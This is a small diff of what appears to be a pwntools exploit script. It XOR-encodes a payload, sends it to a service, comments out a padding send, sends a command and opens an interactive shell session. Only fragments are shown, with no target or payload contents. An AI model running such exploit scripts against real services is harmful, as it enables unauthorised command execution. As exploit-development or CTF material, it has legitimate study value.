@@ -66,7 +66,7 @@ payload = makePayload(payload)
 
 payload = xor(payload, key, keySize)
 send(payload)
-send("AAAA\x00")
+# send("AAAA\x00")
 s.recvuntil("]")
 
 
@@ -78,4 +78,5 @@ s.sendline("Q") # Ending the script
 
 s.sendline(cmd)
 
+s.recv(1024)
 s.interactive()
